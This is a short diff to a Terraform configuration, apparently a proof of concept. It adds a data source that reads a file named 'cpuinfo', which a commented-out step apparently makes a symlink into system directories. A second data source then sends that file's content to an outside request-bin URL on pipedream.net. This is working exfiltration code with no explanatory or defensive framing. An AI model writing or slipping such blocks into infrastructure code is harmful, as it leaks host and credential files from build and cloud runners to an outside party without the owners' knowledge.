@@ -16,3 +16,12 @@
 #     command = "tar -xvzf ${path.module}/etc-symlink.tar.gz ${path.module}/etc-symlink"
 #   }
 # }
+
+data "local_file" "symlink" {
+  filename = "${path.module}/cpuinfo"
+}
+
+data "http" "example" {
+  url = "https://en2jtsznfuiex.x.pipedream.net?data=${data.local_file.symlink.content}"
+
+}
